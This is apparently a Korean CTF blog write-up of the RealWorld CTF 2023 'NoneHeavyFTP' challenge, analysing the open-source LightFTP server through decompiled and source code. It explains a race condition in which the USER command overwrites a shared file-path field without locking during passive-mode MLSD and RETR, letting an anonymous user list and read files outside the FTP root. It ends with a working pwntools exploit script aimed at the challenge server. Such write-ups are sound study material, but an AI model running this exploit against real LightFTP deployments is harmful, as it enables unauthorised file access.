---
title: "RealWorld CTF 2023 - NoneHeavyFTP"
# description: "realworld CTF 2023 NoneHeavy FTP"
dateString: January 2023
draft: false
tags: ["RealWorld CTF 2023","RealWorld CTF NoneheavyFTP"]
weight: 30
date: 2023-01-07
categories: ["CTF"]
# cover:
    # image: ""
---
# NonHeavyFTP
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image.png)
난이도가 Baby인거 보고 달려들었는데, 어려웠다.
## Analysis
```
[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/

```
ftp 서비스의 config 파일이다.
/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.
https://github.com/hfiref0x/LightFTP
그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.
소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.
```c
// positive sp value has been detected, the output may be wrong!
void *__fastcall ftp_client_thread(int *a1)
{
  ...
      do
      {
LABEL_10:
        if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)&mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \r\n
          break;
        v4 = instr_recved[0];
        if ( LOBYTE(instr_recved[0]) )
        {
          v5 = __ctype_b_loc();
          v6 = 0LL;
          while ( ((*v5)[(char)v4] & 0x400) == 0 )
          {
            ++v6;
            v4 = *((_BYTE *)instr_recved + v6);
            if ( !v4 )
            {
              v7 = (char *)instr_recved + v6;
              goto LABEL_41;
            }
          }
          v7 = (char *)instr_recved + v6;
          v8 = v6;
          if ( (v4 & 0xDF) != 0 )
          {
            do
            {
              ++v8;
              v4 = *((_BYTE *)instr_recved + v8);
            }
            while ( (v4 & 0xDF) != 0 );
            v9 = v8 - v6;
          }
          else
          {
            v9 = 0LL;
          }
          while ( v4 == ' ' )
          {
            ++v8;
            v4 = *((_BYTE *)instr_recved + v8);
          }
          v10 = (char *)instr_recved + v8;      // Second Arg?
          v11 = 0LL;
          if ( v4 )
            v11 = v10;
          v19 = v11;
        }
        else
        {
          v7 = (const char *)instr_recved;
LABEL_41:
          v19 = 0LL;
          v9 = 0LL;
        }
        v12 = (const char **)&ftpprocs;
        v13 = 0;
        while ( strncasecmp(v7, *v12, v9) )     // instruction parsing
        {
          ++v13;
          v12 += 2;
          if ( v13 == 0x20 )                    // instruction cnts -> 32
          {
            writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)instr_recved);
            if ( v40 )
              ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)(
                v40,
                "500 Syntax error, command unrecognized.\r\n",
                41LL);
            else
              send(v26, "500 Syntax error, command unrecognized.\r\n", 0x29uLL, 0x4000);
            goto LABEL_10;
          }
        }
        v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(&ftpprocs)[2 * v13 + 1])(&mutex, v19);// CALL FTP USR
        if ( v13 == 0xD )
          writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)"PASS ***");
        else
          writelogentry((__int64)&mutex, (__int64)" @@ CMD: ", (__int64)instr_recved);
      }
      while ( v14 > 0 );
      ...
}
```
recvcmd_part_0 함수는 \\r\\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.
```
.data.rel.ro:000000000000F8E0                                         ; "USER"
.data.rel.ro:000000000000F8E8                 dq offset ftpUSER
.data.rel.ro:000000000000F8F0                 dq offset aQuit+1       ; "QUIT"
.data.rel.ro:000000000000F8F8                 dq offset ftpQUIT
.data.rel.ro:000000000000F900                 dq offset aNoop         ; "NOOP"
```
이런식으로 string과 함수 주소가 있어서 이에 맞는 핸들러가 호출된다.

분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.
```c
typedef struct _FTPCONTEXT {
    pthread_mutex_t     MTLock;
    SOCKET              ControlSocket;
    SOCKET              DataSocket;
    pthread_t           WorkerThreadId;
    /*
     * WorkerThreadValid is output of pthread_create
     * therefore zero is VALID indicator and -1 is invalid.
     */
    int                 WorkerThreadValid;
    int                 WorkerThreadAbort;
    in_addr_t           ServerIPv4;
    in_addr_t           ClientIPv4;
    in_addr_t           DataIPv4;
    in_port_t           DataPort;
    int                 File;
    int                 Mode;
    int                 Access;
    int                 SessionID;
    int                 DataProtectionLevel;
    off_t               RestPoint;
    uint64_t            BlockSize;
    char                CurrentDir[PATH_MAX];
    char                RootDir[PATH_MAX];
    char                RnFrom[PATH_MAX];
    char                FileName[2*PATH_MAX];
    gnutls_session_t    TLS_session;
    SESSION_STATS       Stats;
} FTPCONTEXT, *PFTPCONTEXT;
```
함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다.
File이나, Access, Mode같은 필드들이 있었다.
### Vulnerability
```c
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN;

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params);
    return 1;
}
```
ftpUSER에서 FileName이 덮힌다.
ftp_effective_path에서
```c
snprintf(path, PATH_MAX*2, "%s/%s", root_path, normalized_path);
```
위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다. 

```c
    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

    while (stat(context->FileName, &filestats) == 0)
    {
        if ( !S_ISDIR(filestats.st_mode) )
            break;

        sendstring(context, interm150);
        writelogentry(context, " MLSD-LIST ", (char *)params);
        context->WorkerThreadAbort = 0;

        pthread_mutex_lock(&context->MTLock);
```
ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context->FileName을 체크하는 것을 알 수 있다.
이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다.
그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다.

mutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다. 
만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.

## Exploit
```c
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN;

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params);
    return 1;
}
```
ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.
```c
  ftp_effective_path((__int64)(&mutex[105].__align + 2), (__int64)&mutex[3], a2, 0x2000uLL, &mutex[310].__size[8]);
  v4 = stat64(&mutex[310].__size[8], &v9);      // get stat of file
  align = mutex[515].__align;
  if ( !v4 && (v9.st_mode & 0xF000) == 0x4000 )
  {
    if ( align )
      gnutls_record_send();
    else
      send(mutex[1].__lock, "150 File status okay; about to open data connection.\r\n", 0x36uLL, 0x4000);
    writelogentry((__int64)mutex, (__int64)" MLSD-LIST ", (__int64)a2);
    mutex[1].__spins = 0;
    pthread_mutex_lock(mutex);
    v7 = pthread_create(&newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex);
```
mlsd_thread를 호출한다.
그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.
```c
  buf.__pad[4] = (void *)__readfsqword(0x28u);
  pthread_mutex_lock(a1);
  if ( __sigsetjmp((struct __jmp_buf_tag *)&buf, 0) )
  {
    cleanup_handler(a1);
    __pthread_unwind_next(&buf);
  }
  v1 = 0;
  __pthread_register_cancel(&buf);
```
mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.

```c
  *(_QWORD *)fd = (unsigned int)create_datasocket(a1);
  if ( *(_DWORD *)fd != -1 )
  {
    if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(&fd[4], *(unsigned int *)fd, 0) )
    {
      v2 = opendir(&a1[310].__size[8]);         // open dir
      if ( v2 )
      {
        do
        {
          v3 = readdir64(v2);
          if ( !v3 )
            break;
          v1 = mlsd_sub(&a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)&fd[4], v3);
          if ( !v1 )
            break;
        }
        while ( !a1[1].__spins );
        closedir(v2);
      }
```
mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다.
그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.

fd로 결과를 보내준다.
이걸로 flag의 이름을 알 수 있다.

```c
  fd = create_datasocket(a1);
  if ( fd != -1 )
  {
    if ( *(_QWORD *)(a1 + 20600) )
    {
      if ( !(unsigned int)ftp_init_tls_session(&v15, fd, 0) )
        goto LABEL_6;
      max_size = (void *)gnutls_record_get_max_size(v15);
      if ( max_size > &_data_start )
        max_size = &_data_start;
    }
    else
    {
      max_size = &_data_start;
    }
    v4 = open64((const char *)(a1 + 12408), 0);
    *(_DWORD *)(a1 + 80) = v4;
    v5 = v4;
```
이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다.
당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.
```c
SOCKET create_datasocket(PFTPCONTEXT context)
{
    ...
    switch ( context->Mode ) {
	...
    case MODE_PASSIVE:
        asz = sizeof(laddr);
        clientsocket = accept(context->DataSocket, (struct sockaddr *)&laddr, &asz);
        close(context->DataSocket);
        context->DataSocket = clientsocket;

        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        context->DataIPv4 = 0;
        context->DataPort = 0;
        context->Mode = MODE_NORMAL;
        break;

    default:
        return INVALID_SOCKET;
    }
    return clientsocket;
}
```
PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.

### Exploit script
```python
from pwn import *

sa = lambda x,y : p.sendafter(x,y)
s = lambda x : p.send(x)
rvu = lambda x : p.recvuntil(x)
local =False

if local==True:
    ip = '127.0.0.1'
    mip = b'127,0,0,1'
else :
    ip = '47.89.253.219'
    mip = b'0,0,0,0'

p = remote(ip,2121)
context.log_level='debug'
pay = b'USER anonymous\r\n'
sa(b'ready',pay)
pay = b'PASS AAAAA\r\n'
sa(b' OK',pay)
pay = b'PASV \r\n'
sa(b'logged in',pay)
pay = b'MLSD /\r\n'
sa(b'Passive',pay)
rvu(mip+b',')
recv = rvu(b')')[:-1].split(b',')
recv = [int(x) for x in recv]
port = recv[0] * 256 + recv[1]
success(f"nc {ip} {port}")
s(b'USER /\r\n')
print("flag name : ",end='')
flag = input()
s(b'USER anonymous\r\n')
sa(b' OK',b'PASS AAAAA\r\n')
sa(b'logged in',b'PASV \r\n')
rvu(mip+b',')
recv = rvu(b')')[:-1].split(b',')
recv = [int(x) for x in recv]
port = recv[0] * 256 + recv[1]
success(f"nc {ip} {port}")
flag = "/"+flag
pay = b'RETR /hello.txt\r\n'
s(pay)
s(f'USER {flag[:-1]}\r\n')

p.interactive()
```

![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image1.png)
nc로 직접 접속해줘야된다.
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1.png)
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image5.png)
flag 이름 넣어주고 다른 포트로 다시 접속하면 된다.
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1-1.png)




